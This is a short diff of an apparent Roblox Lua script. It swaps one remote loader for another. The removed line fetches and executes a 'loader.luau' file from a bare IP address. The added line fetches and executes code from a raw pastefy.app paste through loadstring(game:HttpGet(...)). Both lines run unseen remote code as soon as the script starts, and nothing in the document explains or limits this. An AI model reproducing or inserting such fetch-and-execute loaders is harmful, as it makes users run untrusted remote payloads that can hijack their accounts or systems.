@@ -1,5 +1,4 @@
-ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/uCl1cwsD/raw"))()
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
